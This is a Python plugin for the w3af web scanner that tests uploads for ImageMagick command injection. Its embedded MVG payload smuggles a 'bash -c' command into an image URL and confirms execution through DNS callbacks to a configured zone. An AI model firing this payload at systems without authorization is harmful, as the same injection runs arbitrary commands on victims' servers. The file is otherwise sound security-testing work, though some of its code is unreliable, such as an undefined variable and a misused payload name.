import w3af.core.data.kb.knowledge_base as kb

from w3af.core.controllers.plugins.audit_plugin import AuditPlugin

from w3af.core.data.options.opt_factory import opt_factory
from w3af.core.data.options.option_list import OptionList
from w3af.core.data.fuzzer.fuzzer import create_mutants
from w3af.core.data.fuzzer.mutants.filecontent_mutant import FileContentMutant

import w3af.core.controllers.output_manager as om
import w3af.core.data.constants.severity as severity

from w3af.core.data.kb.vuln import Vuln
from w3af.core.data.kb.info import Info
from w3af.core.controllers.exceptions import HTTPRequestException

from w3af.core.controllers.core_helpers.detect_resolve import Resolver


class imagemagic(AuditPlugin):
	"""
	Identify imagemagic os-injection (blind method)

	:author: @s0i37
	"""
	PAYLOAD = '''
push graphic-context
viewbox 0 0 640 480
fill 'url(https://{detect}"|bash -c "ping {rce})'
pop graphic-context
	'''

	def __init__(self):
		AuditPlugin.__init__(self)
		self._dns_zone = ''
		self._resolver = None

	def audit(self, freq, orig_response):
		if not self._dns_zone:
			om.out.debug("DNS zone not configured!")
			return

		self.fqdn_imagemagic_exist = "im.{target}.{domain}".format( target=freq.get_uri().get_domain(), domain=self._dns_zone )
		self.fqdn_imagemagic_vuln = "rce.{target}.{domain}".format( target=freq.get_uri().get_domain(), domain=self._dns_zone )
		PAYLOAD = PAYLOAD.format( detect=self.fqdn_imagemagic_exist, rce=self.fqdn_imagemagic_vuln )
		for mutant in create_mutants(freq, [PAYLOAD, ]):
			if isinstance(mutant, FileContentMutant):
				try:
					response = self._uri_opener.send_mutant( mutant, cache=False, timeout=10 )
					if self.check(self.fqdn_imagemagic_exist):
						desc = 'Imagemagic found: "%s"' % response.get_uri()
						i = Info('Imagemagic detected', desc, response.id, self.get_name())
						i.add_to_highlight('Imagemagic')
						i.set_url(url)
						self.kb_append_uniq('imagemagic', i)

					if self.check(self.fqdn_imagemagic_vuln):
						desc = 'Imagemagic OS-injection at: "%s", using'\
							' HTTP method %s. The injectable parameter may be: "%s"'
						desc = desc % ( mutant.get_url(),
										mutant.get_method(),
										mutant.get_token_name() )
						vuln = Vuln.from_mutant('Imagemagic OS-injection vulnerability', desc,
										severity.HIGH, response.id, 'xxe',
										mutant)
						om.out.debug( vuln.get_desc() )
						om.out.vulnerability("imagemagic os injection", severity=severity.HIGH)

				except HTTPRequestException:
					om.out.debug("HTTPRequestException")
				except Exception as e:
					om.out.debug( str(e) )

	def check(self, fqdn):
		return self._resolver.query_norecure(fqdn) == []

	def get_options(self):
		"""
		:return: A list of option objects for this plugin.
		"""
		opt_list = OptionList()

		h1 = 'DNS server of this zone must cache any dns-requests.'
		opt = opt_factory('dns_zone', self._dns_zone, 'caching wildcard domain zone for resolve detects', 'string', help=h1)
		opt_list.add(opt)

		return opt_list

	def set_options(self, options_list):
		"""
		This method sets all the options that are configured using the user
		interface generated by the framework using the result of get_options().

		:param options_list: A dictionary with the options for the plugin.
		:return: No value is returned.
		"""
		self._dns_zone = options_list['dns_zone'].get_value()
		self._resolver = Resolver(self._dns_zone)

	def get_long_desc(self):
		"""
		:return: A DETAILED description of the plugin functions and features.
		"""
		return """
		This plugin finds imagemagic OS injections (blind method) using dns request.
		In case if imagemagic is exists and if vulnerable one the victim will send one or two dns-requests respectively.
		Then we	send no-recursive dns-request to the same dns-name.

		Only one configurable parameters exists:
		    - dns_zone
		"""